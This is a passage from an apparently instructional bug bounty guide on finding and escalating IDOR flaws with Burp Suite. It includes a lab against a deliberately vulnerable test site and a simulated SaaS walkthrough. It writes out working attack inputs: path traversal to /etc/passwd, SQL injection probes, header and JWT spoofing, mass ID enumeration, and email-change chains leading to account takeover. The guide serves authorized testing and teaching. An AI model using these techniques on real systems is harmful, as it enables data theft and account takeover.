   → 403 Forbidden          = Properly protected ❌
   → 401 Unauthorized       = Properly protected ❌
   → 404 Not Found          = May be protected, or may be blind IDOR
   → 500 Server Error       = Interesting! Server-side issue, investigate
```

**Test Matrix — Be Thorough:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    CROSS-ACCOUNT TEST MATRIX                    │
├──────────────┬─────────────────────┬────────────────────────────┤
│ From (Auth)  │ Accessing (Target)  │ What to Test               │
├──────────────┼─────────────────────┼────────────────────────────┤
│ Account A    │ Account B objects   │ Horizontal IDOR            │
│ Account B    │ Account A objects   │ Horizontal (reverse)       │
│ Account A    │ Admin objects       │ Vertical IDOR              │
│ No auth      │ Account A objects   │ Unauthenticated IDOR       │
│ Account A    │ Non-existent IDs    │ Enumeration / blind IDOR   │
│ Account A    │ Account A objects   │ Baseline (should work)     │
│ Expired token│ Account B objects   │ Session handling check      │
└──────────────┴─────────────────────┴────────────────────────────┘
```

> 📖 **From "Bug Bounty Bootcamp" by Vickie Li:**
> _"Always test both directions. Just because Account A can't access Account B's data doesn't mean Account B can't access Account A's data. Some authorization logic is asymmetric — for example, premium users might have different access controls than free users."_

---

### Step 6: Verify & Prove Impact

A bug is only a bug if you can **prove** it. Here's how to create undeniable proof:

**Verification checklist:**

```
☐ The response contains data that BELONGS to Account B
☐ The data matches what you created in Account B during setup
   (e.g., bio = "VICTIM_PROFILE_TEST")
☐ You've confirmed the request uses Account A's session/token
☐ The data is NOT cached or stale from a previous session
☐ You've tested in a clean browser / incognito to rule out caching
☐ You can reproduce it consistently (not a one-time fluke)
```

**Screenshot methodology (for your report):**

```
Screenshot 1: Account B's profile (logged in as B) — showing unique data
Screenshot 2: Account A's session token / cookies
Screenshot 3: Burp Repeater showing the tampered request (A's session + B's ID)
Screenshot 4: Response containing B's data
Screenshot 5: Highlight the specific PII / sensitive data exposed
```

---

### Step 7: Escalate Before Reporting

Before you hit "Submit," think about **how to maximize the impact** of your finding. This directly affects your bounty payout.

**Escalation questions:**

```
☐ Can I access ALL users' data by iterating IDs? (1 → 100,000)
   → This turns a single IDOR into mass data exfiltration
   
☐ Can I WRITE/MODIFY data, not just read?
   → Change email → password reset → account takeover
   
☐ Can I DELETE data?
   → Data destruction, denial of service
   
☐ Does this work on admin accounts too?
   → Horizontal → Vertical escalation
   
☐ Can I chain this with another vulnerability?
   → IDOR + XSS, IDOR + CSRF, IDOR + SSRF
   
☐ What's the most sensitive data exposed?
   → PII, financial, medical, credentials = higher severity
   
☐ How many users are affected?
   → "All 500,000 users" hits different than "some users"
```

---

## 7. 🔧 Burp Suite Setup for IDOR Hunting

Burp Suite is your **primary weapon** for IDOR hunting. This section covers the complete setup — from configuration to extensions to workflow.

### Initial Burp Configuration

#### Proxy Setup

```
Burp → Proxy → Options:
├── Proxy Listeners: 127.0.0.1:8080 (default)
├── Intercept Client Requests: ✅ Enabled
├── Intercept Server Responses: ✅ Enable for in-scope items
└── Match and Replace: (we'll configure this)
```

**Browser Setup:**
```
Firefox (recommended):
├── Settings → Network → Manual Proxy
├── HTTP Proxy: 127.0.0.1, Port: 8080
├── ✅ Also use this proxy for HTTPS
└── Install Burp's CA certificate: http://burp → CA Certificate
```

#### Scope Configuration

Always set scope to avoid noise:

```
Burp → Target → Scope:
├── Include in scope:
│   ├── Protocol: Any
│   ├── Host: target.com
│   ├── Port: Any
│   └── File: ^/api/.*    (focus on API endpoints)
│
└── Exclude from scope:
    ├── *.google.com
    ├── *.googleapis.com
    ├── *.gstatic.com
    ├── *.facebook.com
    └── *.analytics.com
```

#### HTTP History Filters

```
Burp → Proxy → HTTP History → Filter:
├── ✅ Show only in-scope items
├── ✅ Hide CSS/JS/Images (Filter by MIME type)
├── Show: HTML, JSON, XML
├── Hide: 304 Not Modified (cached responses)
└── Annotation: Color-code interesting requests
```

### Essential Burp Extensions for IDOR

Install these from **BApp Store** (Extender → BApp Store):

#### 1. Autorize (★ MOST IMPORTANT ★)

**What it does:** Automatically replays every request with a different user's session token. It's like having a robot test every request for IDOR.

```
Setup:
1. Install Autorize from BApp Store
2. Log into Account B in a different browser
3. Copy Account B's session cookie/token
4. Open Autorize tab → paste the cookie into "Cookie header"
5. Set enforcement detector:
   ├── "Enforced" = response differs from original (protected ✅)
   └── "Not Enforced" = response is same (IDOR! 🔴)
6. Turn Autorize ON
7. Now browse the app as Account A — Autorize tests every request as Account B

Autorize Configuration:
┌──────────────────────────────────────────────────────────────────┐
│  Autorize Tab                                                    │
│                                                                  │
│  Authorization Cookie:                                           │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ Cookie: session=ACCOUNT_B_SESSION_TOKEN_HERE              │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ☑ Check unauthenticated (also test with NO cookies)             │
│  ☑ Intercept requests from all tools                             │
│                                                                  │
│  Enforcement Detectors:                                          │
│  ☑ Auto-detect                                                   │
│  ☐ Content-length difference                                     │
│  ☐ Response body difference                                      │
│                                                                  │
│  Filters:                                                        │
│  ☑ Scope items only                                              │
│  ☐ Filter by path                                                │
│                                                                  │
│  [▶ Autorize is ON]                                              │
└──────────────────────────────────────────────────────────────────┘
```

**Reading Autorize Results:**

```
🔴 Red   = "Bypassed!"     → Authorization NOT enforced → IDOR exists!
🟡 Yellow = "Possible"      → Investigate manually
🟢 Green  = "Enforced"      → Authorization is working correctly
```

> 📖 **From "Hacking APIs" by Corey Ball:**
> _"Autorize is the single most useful Burp extension for testing Broken Object Level Authorization. Configure it once with a low-privilege token, then simply browse the application. Every red entry is a potential vulnerability."_

#### 2. Auth Analyzer

Similar to Autorize but with more granular control:

```
Setup:
1. Install from BApp Store
2. Create multiple "sessions" — one for each test account
3. Define which headers/cookies represent the session
4. Browse as Account A — Auth Analyzer replays with all sessions
5. Compare response bodies side by side
```

#### 3. Param Miner

Discovers hidden parameters that might be IDOR vectors:

```
Usage:
1. Right-click any request → Extensions → Param Miner → Guess params
2. It fuzzes for hidden parameters:
   ├── ?user_id=1
   ├── ?account_id=1
   ├── ?admin=true
   ├── ?debug=1
   └── ?id=1
```

#### 4. InQL (for GraphQL targets)

```
Usage:
1. Point InQL at the GraphQL endpoint
2. It auto-discovers: queries, mutations, subscriptions
3. Generates all possible queries with all fields
4. Test each query with different user IDs
```

#### 5. JSON Web Token Editor (JWT Editor)

```
Usage:
1. Intercept requests with JWT tokens
2. Decode and modify claims (user_id, role, org_id)
3. Re-sign with known/guessed secrets
4. Test algorithm confusion (RS256 → HS256)
```

### Burp Repeater Workflow for IDOR Testing

Repeater is where you do the **manual precision testing**.

```
Step-by-step Repeater Workflow:
│
│  1. Find interesting request in HTTP History
│     GET /api/users/48291/profile
│     Cookie: session=ACCOUNT_A_TOKEN
│
│  2. Send to Repeater (Ctrl+R)
│
│  3. Create multiple tabs in Repeater:
│     ├── Tab 1: "Original"       → Keep the original request untouched
│     ├── Tab 2: "Other User"     → Change ID to Account B's ID
│     ├── Tab 3: "Admin User"     → Change ID to admin's ID (if known)
│     ├── Tab 4: "No Auth"        → Remove session cookie entirely
│     └── Tab 5: "Invalid ID"     → Use a non-existent ID
│
│  4. Send each tab and COMPARE responses:
│     ├── Tab 1 vs Tab 2: If same 200 + different data → IDOR
│     ├── Tab 1 vs Tab 3: If 200 + admin data → Vertical IDOR
│     ├── Tab 1 vs Tab 4: If 200 + data → Auth bypass
│     └── Tab 1 vs Tab 5: If 200 → Blind IDOR / enum risk
│
│  5. Use Comparer (Ctrl+select two responses → Compare):
│     → Visual diff between responses to spot subtle differences
```

### Burp Intruder for Mass IDOR Testing

When you've confirmed an IDOR exists with one ID, use Intruder to test at scale:

```
Intruder Configuration:
│
│  Request:
│  GET /api/users/§48291§/profile     ← §markers§ around the ID
│  Cookie: session=ACCOUNT_A_TOKEN
│
│  Attack Type: Sniper
│
│  Payload:
│  ├── Type: Numbers
│  ├── From: 1
│  ├── To: 1000
│  ├── Step: 1
│  └── (Or use a wordlist of known IDs)
│
│  Options:
│  ├── Threads: 5 (don't be aggressive — avoid rate limits)
│  ├── Redirections: Follow (some IDORs redirect)
│  └── Grep - Extract: Extract specific response fields
│
│  Analyzing Results:
│  ├── Sort by Status Code: Look for 200s among 403s
│  ├── Sort by Response Length: Different lengths = different data
│  └── Grep for sensitive keywords: "email", "password", "ssn"
```

### Match and Replace Rules (Useful Tricks)

```
Burp → Proxy → Options → Match and Replace:

Rule 1: Auto-swap user ID (for quick testing)
├── Type: Request header
├── Match: user_id=48291
├── Replace: user_id=48292
├── ☐ Enabled (toggle when needed)

Rule 2: Add custom header
├── Type: Request header
├── Match: (empty)
├── Replace: X-Forwarded-For: 127.0.0.1
├── ☑ Enabled (bypass IP-based controls)

Rule 3: Force JSON content type
├── Type: Request header
├── Match: Content-Type: application/x-www-form-urlencoded
├── Replace: Content-Type: application/json
├── ☐ Enabled
```

---

## 8. 🧪 Hands-On Lab: testphp.vulnweb.com

**testphp.vulnweb.com** is Acunetix's intentionally vulnerable web application. It's legal to test and contains multiple vulnerability types including IDOR. Let's walk through it step by step.

> **Target:** http://testphp.vulnweb.com
> **Legal:** Yes — this is a deliberately vulnerable application for testing
> **No account needed:** The app has a built-in test user

### Step 1: Reconnaissance — Explore the Application

Open the target in your browser (with Burp proxy active):

```
http://testphp.vulnweb.com/
```

**Key pages to visit:**

```
http://testphp.vulnweb.com/                    → Homepage (art store)
http://testphp.vulnweb.com/login.php           → Login page
http://testphp.vulnweb.com/signup.php          → Registration
http://testphp.vulnweb.com/userinfo.php        → User profile (after login)
http://testphp.vulnweb.com/listproducts.php    → Product listing
http://testphp.vulnweb.com/artists.php         → Artist listing
http://testphp.vulnweb.com/guestbook.php       → Guestbook
http://testphp.vulnweb.com/cart.php            → Shopping cart
http://testphp.vulnweb.com/AJAX/index.php      → AJAX-based interface
```

**Login with the test account:**

```
Username: test
Password: test
```

### Step 2: Identify Object References

After logging in and browsing, look at these requests in Burp HTTP History:

**Product Pages — Numeric ID in URL parameter:**

```
GET /listproducts.php?cat=1     → Category 1 (Posters)
GET /listproducts.php?cat=2     → Category 2 (...)
GET /listproducts.php?cat=3     → Category 3 (...)
GET /listproducts.php?cat=4     → Category 4 (...)
```

**Individual Artist Pages:**

```
GET /artists.php?artist=1       → Artist 1
GET /artists.php?artist=2       → Artist 2
GET /artists.php?artist=3       → Artist 3
```

**Product Detail:**

```
GET /product.php?pic=1          → Product 1
GET /product.php?pic=2          → Product 2
```

### Step 3: IDOR Testing on Product/Category Endpoints

**Test: Can we access categories beyond what the UI shows?**

```
Burp Repeater:

Request 1 (Normal):
GET /listproducts.php?cat=1 HTTP/1.1
Host: testphp.vulnweb.com
→ 200 OK — Shows "Posters" category

Request 2 (Enumerate):
GET /listproducts.php?cat=2 HTTP/1.1
Host: testphp.vulnweb.com
→ 200 OK — Shows different category

Request 3 (Out of range):
GET /listproducts.php?cat=0 HTTP/1.1
Host: testphp.vulnweb.com
→ ??? (Check response)

Request 4 (Negative number):
GET /listproducts.php?cat=-1 HTTP/1.1
Host: testphp.vulnweb.com
→ ??? (Check for errors/debug info)

Request 5 (Large number):
GET /listproducts.php?cat=99999 HTTP/1.1
Host: testphp.vulnweb.com
→ ??? (Check for error messages)

Request 6 (SQL Injection via IDOR parameter):
GET /listproducts.php?cat=1' HTTP/1.1
Host: testphp.vulnweb.com
→ ??? (SQL error = SQLi + IDOR surface!)
```

> ⚡ **Key Finding:** On testphp.vulnweb.com, the `cat` parameter is directly used in a SQL query without sanitization. This means the IDOR surface is also an **SQL injection** surface! This is a common real-world pattern.

### Step 4: IDOR on Artist Endpoints

```
Burp Intruder:

GET /artists.php?artist=§1§ HTTP/1.1
Host: testphp.vulnweb.com

Payload: Numbers 1–100, Step 1

Results:
├── artist=1  → 200 OK, 5,421 bytes  → Valid artist
├── artist=2  → 200 OK, 3,887 bytes  → Valid artist  
├── artist=3  → 200 OK, 4,102 bytes  → Valid artist
├── artist=4  → 200 OK, 0 bytes      → Empty (no artist)
├── ...
└── artist=100 → 200 OK, 0 bytes     → Empty

Observation: No access control. Any ID returns data if it exists.
There's no authentication check — even without logging in, you can access all artists.
```

### Step 5: IDOR on User Profile Data

After logging in as `test/test`:

```
Visit: http://testphp.vulnweb.com/userinfo.php

Burp captures:
POST /userinfo.php HTTP/1.1
Host: testphp.vulnweb.com
Cookie: login=test%2Ftest

Response contains:
- Username: test
- Email address
- Credit card number (!)
- Phone number
```

**Now test: Can we access other users' info?**

Examine how the session identifies the user. Look at the cookie:

```
Cookie: login=test%2Ftest
         ^^^^^^^^^^^^
URL-decoded: test/test  (username/password in the cookie!)
```

> 🚨 **Critical Finding:** The cookie literally contains the **username and password** in plaintext! This means:
> 1. No real session management
> 2. If you know another user's credentials, you just set the cookie
> 3. The server uses the cookie value directly to look up user data

**This is IDOR through cookie manipulation:**

```
Original:  Cookie: login=test%2Ftest
Tampered:  Cookie: login=admin%2Fadmin     ← Try admin/admin
Tampered:  Cookie: login=john%2Fjohn       ← Try other users
```

### Step 6: File-Based IDOR

testphp.vulnweb.com has file access endpoints:

```
GET /showimage.php?file=./pictures/1.jpg
GET /showimage.php?file=./pictures/2.jpg

IDOR + Path Traversal:
GET /showimage.php?file=../../../etc/passwd
    → If this works, it's IDOR + LFI (Local File Inclusion)

GET /showimage.php?file=./database.txt
GET /showimage.php?file=./config.php
GET /showimage.php?file=./admin/settings.php
```

### Step 7: AJAX-Based IDOR

The AJAX section has additional endpoints:

```
http://testphp.vulnweb.com/AJAX/index.php

Explore the JavaScript sources:
├── Look for API endpoints in JS files
├── XMLHttpRequest / fetch calls with user IDs
└── Hidden parameters in AJAX requests
```

### Summary of Findings on testphp.vulnweb.com

```
┌───┬──────────────────────────────────────┬──────────┬──────────────────────────┐
│ # │ Vulnerability                        │ Severity │ IDOR Type                │
├───┼──────────────────────────────────────┼──────────┼──────────────────────────┤
│ 1 │ Category enum via ?cat= parameter    │ Low      │ Horizontal (read)        │
│ 2 │ Artist enum via ?artist= parameter   │ Low      │ Horizontal (read)        │
│ 3 │ Product enum via ?pic= parameter     │ Low      │ Horizontal (read)        │
│ 4 │ User credentials in cookie           │ Critical │ Auth bypass / IDOR       │
│ 5 │ Credit card exposed in profile       │ Critical │ Data exposure            │
│ 6 │ File access via showimage.php        │ High     │ File-based IDOR / LFI    │
│ 7 │ SQL injection via IDOR parameters    │ Critical │ IDOR surface → SQLi      │
│ 8 │ No auth required for data access     │ High     │ Unauthenticated IDOR     │
└───┴──────────────────────────────────────┴──────────┴──────────────────────────┘
```

### Lessons from This Lab

```
1. IDOR and SQL injection often share the same surface — test both
2. Cookie-based authentication can contain IDOR vectors
3. File parameters are IDOR targets (and LFI targets)
4. The UI only shows you SOME objects — always enumerate beyond UI
5. Unauthenticated access is the worst form of IDOR
6. Multiple low-severity IDORs can combine into a critical finding
```

---

## 9. 🌐 Real-World Hunting Walkthrough

This section simulates how you'd hunt IDOR on a **real production web application** — a typical SaaS app with user accounts, billing, teams, and API access. We'll use a generic example pattern that applies to almost any target.

> ⚠️ **Important:** Only test on applications where you have **explicit authorization** — either through a bug bounty program or written permission.

### The Target Profile

Imagine a target like this (common SaaS pattern):

```
Application: A project management SaaS (like Trello/Asana/Jira)
Features:
├── User accounts with profiles
├── Organizations / Workspaces
├── Projects within organizations
├── Tasks within projects
├── File attachments on tasks
├── Comments on tasks
├── Team invitations
├── Billing & invoices
├── API keys
├── Webhooks
├── Export functionality
└── Admin panel for org owners
```

### Phase 1: Account Registration & Recon

```
Step 1: Register two accounts
├── Account A: attacker@youremail.com → Creates "Attacker Org"
└── Account B: victim@youremail.com   → Creates "Victim Org"

Step 2: In Account B, create identifiable data:
├── Organization name: "VICTIM_ORG_IDOR_TEST"
├── Project name: "Secret Project Alpha"
├── Task: "Confidential Task — VICTIM_DATA"
├── Upload a file: "secret_document.pdf"
├── Add a comment: "VICTIM_COMMENT_TEST_12345"
├── Generate an API key
├── Create an invoice
└── Invite a team member (your third email)

Step 3: Note down Account B's IDs
Browse Account B and record every ID you see:
├── User ID: usr_7742
├── Org ID: org_3381
├── Project ID: proj_5519
├── Task ID: task_88210
├── File ID: file_a8f3e2b1
├── Comment ID: cmt_442891
├── API Key ID: key_xK8j2m
├── Invoice ID: inv_2026_0442
└── Team ID: team_1190
```

### Phase 2: Map the API from Account A

Log into Account A with Burp proxy active. Use every feature.

```
Burp HTTP History — Interesting requests found:

# User Profile
GET  /api/v2/users/usr_6618/profile         → My profile
PUT  /api/v2/users/usr_6618/profile         → Update profile
GET  /api/v2/users/usr_6618/avatar          → My avatar

# Organization
GET  /api/v2/orgs/org_2247                  → My org details
GET  /api/v2/orgs/org_2247/members          → Org members
POST /api/v2/orgs/org_2247/invite           → Invite member
PUT  /api/v2/orgs/org_2247/settings         → Org settings
GET  /api/v2/orgs/org_2247/billing          → Billing info

# Projects
GET  /api/v2/projects/proj_4410             → My project
POST /api/v2/projects                       → Create project
PUT  /api/v2/projects/proj_4410             → Update project
DELETE /api/v2/projects/proj_4410           → Delete project

# Tasks
GET  /api/v2/tasks/task_77101              → My task
POST /api/v2/tasks                          → Create task
PUT  /api/v2/tasks/task_77101              → Update task
GET  /api/v2/tasks/task_77101/comments     → Task comments
POST /api/v2/tasks/task_77101/comments     → Add comment

# Files
GET  /api/v2/files/file_b2c4d6e8/download  → Download file
POST /api/v2/files/upload                   → Upload file

# Export
GET  /api/v2/export/org/org_2247           → Export org data

# API Keys
GET  /api/v2/keys                           → List my API keys
POST /api/v2/keys                           → Create key
DELETE /api/v2/keys/key_mN9p4q             → Delete key
```

### Phase 3: Systematic Cross-Account Testing

Now — stay logged in as Account A. Replace Account A's IDs with Account B's IDs. Test **every single endpoint**.

```
TEST 1: View victim's profile
─────────────────────────────
Request:
  GET /api/v2/users/usr_7742/profile
  Authorization: Bearer ACCOUNT_A_TOKEN

Expected (secure):  403 Forbidden
Actual:             200 OK + {"name": "Victim", "email": "victim@..."}
Result:             🔴 IDOR CONFIRMED — Horizontal read

TEST 2: View victim's organization
────────────────────────────────────
Request:
  GET /api/v2/orgs/org_3381
  Authorization: Bearer ACCOUNT_A_TOKEN

Expected (secure):  403 Forbidden
Actual:             200 OK + {"name": "VICTIM_ORG_IDOR_TEST", ...}
Result:             🔴 IDOR CONFIRMED — Cross-org read

TEST 3: View victim's project
──────────────────────────────
Request:
  GET /api/v2/projects/proj_5519
  Authorization: Bearer ACCOUNT_A_TOKEN

Expected (secure):  403 Forbidden
Actual:             200 OK + {"name": "Secret Project Alpha", ...}
Result:             🔴 IDOR CONFIRMED — Cross-org project access

TEST 4: Modify victim's profile (Write IDOR)
──────────────────────────────────────────────
Request:
  PUT /api/v2/users/usr_7742/profile
  Authorization: Bearer ACCOUNT_A_TOKEN
  Content-Type: application/json
  {"name": "HACKED_BY_IDOR_TEST"}

Expected (secure):  403 Forbidden
Actual:             200 OK + {"name": "HACKED_BY_IDOR_TEST"}
Result:             🔴 WRITE IDOR — Can modify ANY user's profile

TEST 5: Download victim's file
───────────────────────────────
Request:
  GET /api/v2/files/file_a8f3e2b1/download
  Authorization: Bearer ACCOUNT_A_TOKEN

Expected (secure):  403 Forbidden
Actual:             200 OK + [file contents of secret_document.pdf]
Result:             🔴 IDOR — Arbitrary file download

TEST 6: Delete victim's project (Delete IDOR)
───────────────────────────────────────────────
Request:
  DELETE /api/v2/projects/proj_5519
  Authorization: Bearer ACCOUNT_A_TOKEN

⚠️ DO NOT ACTUALLY SEND THIS ON A REAL TARGET
Instead, test with a safer endpoint first, or report based on the 
read/write IDOR evidence and note that DELETE likely works too.

TEST 7: Export victim's org data (Mass exfiltration)
─────────────────────────────────────────────────────
Request:
  GET /api/v2/export/org/org_3381
  Authorization: Bearer ACCOUNT_A_TOKEN

Expected (secure):  403 Forbidden
Actual:             200 OK + [Complete org data dump: users, projects, tasks]
Result:             🔴 CRITICAL — Full data exfiltration of any org

TEST 8: Invite yourself to victim's org
─────────────────────────────────────────
Request:
  POST /api/v2/orgs/org_3381/invite
  Authorization: Bearer ACCOUNT_A_TOKEN
  {"email": "attacker@youremail.com", "role": "admin"}

Expected (secure):  403 Forbidden
Actual:             200 OK + invitation sent
Result:             🔴 CRITICAL — Can join any org as admin
```

### Phase 4: Escalation Assessment

```
Impact Assessment:
│
├── Scope: Any authenticated user can access ANY other user's/org's data
├── Data exposed: PII, project data, files, billing info, API keys
├── Write capability: Can modify profiles, settings, project data
├── Delete capability: Likely (based on write access pattern)
├── Scale: Entire user base affected
├── Automation: IDs are enumerable (usr_1 through usr_N)
│
├── Attack chain:
│   1. Enumerate user IDs via /api/v2/users/{id}/profile
│   2. For each user, exfiltrate all data via /api/v2/export/org/{org_id}
│   3. Download all files via /api/v2/files/{id}/download
│   4. Modify email addresses via PUT /api/v2/users/{id}/profile
│   5. Request password resets → Account Takeover of ALL users
│
└── CVSS Score: 9.1 (Critical)
    - Attack Vector: Network
    - Attack Complexity: Low
    - Privileges Required: Low (any authenticated user)
    - User Interaction: None
    - Confidentiality Impact: High
    - Integrity Impact: High
    - Availability Impact: Low
```

### Responsible Testing Guidelines

```
DO:
✅ Stop testing once you've confirmed the vulnerability
✅ Use your own test accounts as the "victim"
✅ Access minimal data needed to prove the issue
✅ Report immediately after confirmation
✅ Include remediation advice in your report

DON'T:
❌ Enumerate ALL users in the database
❌ Download other users' actual files
❌ Modify real users' data
❌ Delete anything
❌ Access data beyond what's needed for proof
❌ Sit on the vulnerability — report it right away
```

---

## 10. 🛡️ Bypassing Protections

Sometimes the first test comes back `403 Forbidden`. That doesn't mean there's no IDOR. Developers implement **incomplete** protections that can be bypassed. This section is your toolkit for when the straightforward approach fails.

### Bypass 1: HTTP Method Switching

The authorization check may only exist for one HTTP method:

```
GET /api/users/1002/profile  → 403 Forbidden  (protected!)

Try other methods:
POST /api/users/1002/profile   → 200 OK (!) ← Developers only protected GET
PUT /api/users/1002/profile    → 200 OK (!)
PATCH /api/users/1002/profile  → 200 OK (!)
OPTIONS /api/users/1002/profile → 200 OK (reveals allowed methods)
HEAD /api/users/1002/profile   → 200 OK (no body but confirms access)
```

### Bypass 2: Path Manipulation

Different URL representations of the same endpoint may bypass path-based access controls:

```
Original (blocked):
GET /api/users/1002/profile        → 403

Bypasses to try:
GET /api/users/1002/profile/       → Trailing slash
GET /api/users/1002/profile/.      → Dot at end
GET /api/users/1002//profile       → Double slash
GET /api/users/./1002/profile      → Dot segment
GET /api/users/1002/profile%20     → URL-encoded space
GET /api/users/1002/profile%00     → Null byte
GET /api/users/1002/Profile        → Case change
GET /api/users/1002/PROFILE        → Full uppercase
GET /api/users/1002/profile.json   → Extension added
GET /api/users/1002/profile?       → Trailing question mark
GET /api/users/1002/profile#       → Fragment
GET /api/users/1002/profile;       → Semicolon
GET /API/USERS/1002/PROFILE        → Entire path uppercase
GET /api/v1/users/1002/profile     → Different API version
```

### Bypass 3: Parameter Pollution

Send the same parameter multiple times — the backend might process a different instance than the access control layer:

```
GET /api/users?id=1001&id=1002

How different backends handle this:
├── PHP:       Uses LAST value  → id=1002
├── ASP.NET:   Uses ALL values  → id=1001,1002
├── Node/Express: Uses FIRST   → id=1001
├── Python/Flask:  Uses FIRST  → id=1001
├── Java/Spring:   Uses FIRST  → id=1001
└── Ruby/Rails:    Uses LAST   → id=1002

Attack: If WAF checks first param (1001 = your ID = allowed)
        but backend uses last param (1002 = victim's ID)
        → Bypass!
```

### Bypass 4: Wrapping IDs in Arrays/Objects

If the API expects a plain integer, try wrapping it:

```
Original: {"user_id": 1001}

Try:
{"user_id": [1002]}                    → Array wrapping
{"user_id": {"id": 1002}}             → Object wrapping
{"user_id": "1002"}                   → String instead of integer
{"user_id": 1002.0}                   → Float instead of integer
{"user_id": 1002, "user_id": 1001}    → Duplicate key (last wins in most parsers)
```

### Bypass 5: Wildcard and Special Values

```
GET /api/users/*/profile         → Wildcard — might return all users
GET /api/users/me/profile        → "me" endpoint — then check other magic words
GET /api/users/self/profile      → "self" alias
GET /api/users/0/profile         → Zero — might be admin or error
GET /api/users/-1/profile        → Negative — might bypass range checks
GET /api/users/null/profile      → Null string
GET /api/users/undefined/profile → JavaScript artifact
GET /api/users/true/profile      → Boolean coercion
GET /api/users/NaN/profile       → Not a Number
```

### Bypass 6: Content-Type Switching

Change how data is sent — the backend may parse it differently:

```
Original (JSON):
POST /api/users/1002/profile
Content-Type: application/json
{"action": "view"}

Try XML:
POST /api/users/1002/profile
Content-Type: application/xml
<request><action>view</action></request>

Try form-data:
POST /api/users/1002/profile
Content-Type: application/x-www-form-urlencoded
action=view

Try multipart:
POST /api/users/1002/profile
Content-Type: multipart/form-data; boundary=---
---
Content-Disposition: form-data; name="action"
view
```

### Bypass 7: Header Injection for IP/Role Spoofing

Some apps use headers for internal routing or trust decisions:

```
Add these headers to your requests:
X-Forwarded-For: 127.0.0.1
X-Original-URL: /api/admin/users/1002
X-Rewrite-URL: /api/admin/users/1002
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: admin.target.com
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-User-Role: admin
X-Admin: true
```

### Bypass 8: Encoded ID Variants

```
Original ID: 1002

URL Encoding:  %31%30%30%32
Double Encoding: %2531%2530%2530%2532
Unicode: ①⓪⓪②  (Unicode number forms)
Hex: 0x3EA
Octal: 01752
Scientific: 1.002e3
Binary in query: user_id=0b1111101010
```

### Bypass 9: Race Conditions

Sometimes authorization is checked **after** data is fetched, and a race condition exposes it:

```
Send 100 requests simultaneously to:
GET /api/users/1002/profile
Authorization: Bearer ACCOUNT_A_TOKEN

Some requests may slip through before the auth check completes.

Use Burp Intruder with:
├── Payload: Null payloads, 100 count
├── Threads: 25
├── Resource pool: Maximum concurrent requests
└── Check: Any 200 responses among 403s
```

### Bypass 10: JWT Manipulation

If auth uses JWT tokens:

```
Original JWT payload:
{
  "sub": "usr_6618",
  "role": "user",
  "org": "org_2247"
}

Try:
1. Change "sub" to "usr_7742" (victim's ID)
2. Change "role" to "admin"
3. Change algorithm to "none": {"alg": "none"}
4. Sign with empty secret: HMAC(key="")
5. RS256 → HS256 confusion (sign with public key as HMAC secret)
6. Remove signature entirely: header.payload.
7. Add "admin": true claim
```

Use **JWT Editor** Burp extension or https://jwt.io to decode and modify.

> 📖 **From "The Web Application Hacker's Handbook" (Stuttard & Pinto):**
> _"Access controls are only as strong as their weakest implementation point. An application may have robust checks on its main user-facing endpoints, but administrative APIs, legacy endpoints, and non-standard HTTP methods often lack the same protections."_

---

## 11. ⬆️ Escalation Techniques

Finding an IDOR is good. **Maximizing its impact** is what gets you the big bounty. This section teaches you how to turn a low-impact finding into a critical one.

### Escalation Strategy 1: Read → Write → Delete

```
Level 1: You found a read IDOR
GET /api/users/1002/profile → 200 OK (victim's data)
Severity: Medium ($500)

Level 2: Test if you can WRITE
PUT /api/users/1002/profile
{"bio": "IDOR_WRITE_TEST"}
→ 200 OK — Bio changed!
Severity: High ($2,000)

Level 3: Test if you can change EMAIL
PUT /api/users/1002/profile
{"email": "attacker@evil.com"}
→ 200 OK — Email changed!
→ Now request password reset → lands in YOUR inbox → ATO!
Severity: Critical ($5,000-$15,000)

Level 4: Test if you can DELETE
DELETE /api/users/1002
→ DON'T ACTUALLY DO THIS — but mention in report that if
   PUT works without auth, DELETE likely does too.
Severity: Critical
```

### Escalation Strategy 2: Single User → Mass Exfiltration

```
Step 1: Confirm IDOR on one ID
GET /api/users/1/profile → 200 OK

Step 2: Determine ID range
GET /api/users/1/profile       → 200 OK (first user)
GET /api/users/100000/profile  → 404 Not Found
GET /api/users/50000/profile   → 200 OK  
→ Binary search to find the max valid ID

Step 3: In your report, calculate total impact:
"The endpoint /api/users/{id}/profile is vulnerable to IDOR.
 User IDs are sequential integers ranging from 1 to approximately 47,000.
 An attacker could exfiltrate the personal data of all 47,000 users
 with a simple script running in under 30 minutes."

This changes it from "I accessed one user's data" (Medium)
to "Complete user database compromise" (Critical)
```

### Escalation Strategy 3: Horizontal → Vertical

```
Step 1: You have horizontal IDOR (user to user)
GET /api/users/1002/profile → 200 OK

Step 2: Find an admin user's ID
Common patterns:
├── ID = 1 (usually the first registered user = admin)
├── ID = 0 (sometimes reserved for system/admin)
├── Look in: HTML source, JavaScript, error messages
├── Admin username in /about page → look up their user ID
└── Check response for "role" field that might reveal admin IDs

Step 3: Access admin data
GET /api/users/1/profile → 200 OK + {"role": "admin", "email": "admin@target.com"}
GET /api/admin/dashboard → Try accessing admin endpoints with the admin's data

Severity: Critical ($5,000-$25,000)
```

### Escalation Strategy 4: IDOR → Account Takeover (ATO)

This is the **holy grail** of IDOR escalation:

```
Path 1: Email Change → Password Reset
────────────────────────────────────────
PUT /api/users/1002/profile {"email": "attacker@evil.com"}
→ Visit /forgot-password → Enter new email → Reset link arrives → ATO

Path 2: Direct Password Change
────────────────────────────────
PUT /api/users/1002/password {"new_password": "hacked123"}
→ Login as victim → ATO

Path 3: Disable 2FA
────────────────────
DELETE /api/users/1002/2fa
PUT /api/users/1002/settings {"mfa_enabled": false}
→ Now use stolen credentials (from another breach) → ATO

Path 4: Session Token Theft
────────────────────────────
GET /api/users/1002/sessions
→ Response includes active session tokens
→ Use victim's token directly → ATO

Path 5: API Key Theft
──────────────────────
GET /api/users/1002/api-keys
→ Use victim's API key for full API access → ATO equivalent

Path 6: Password Reset Token via IDOR
──────────────────────────────────────
POST /api/password-reset {"email": "victim@email.com"}
GET /api/password-reset-tokens/1002  ← IDOR on the token lookup
→ Get the reset token → Use it → ATO
```

### Escalation Strategy 5: Impact Amplification

Frame your finding for maximum impact in the report:

```
